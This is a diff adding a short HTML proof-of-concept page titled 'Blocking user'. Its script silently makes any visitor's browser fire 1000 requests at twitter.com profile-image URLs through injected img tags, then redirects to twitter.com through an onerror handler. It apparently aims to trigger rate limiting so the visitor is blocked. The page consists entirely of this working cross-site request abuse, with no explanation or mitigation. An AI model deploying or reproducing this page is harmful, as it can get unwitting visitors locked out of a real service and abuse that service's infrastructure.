@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>Blocking user</h2>
+
+<p id="poc"></p>
+
+<script>
+
+for (i=0; i < 1000; i++) {
+
+  var url = "https://twitter.com/user"+i+"/profile_image?size=normal"
+  document.write('<img src="'+url+'">')
+  text = "Request: " + i;
+  document.getElementById("poc").innerHTML = text;
+  if(i==999) {document.write('<img src="'+url+'" onerror="location=\'https://twitter.com\';">');}
+}
+
+</script>
+
+</body>
+</html>
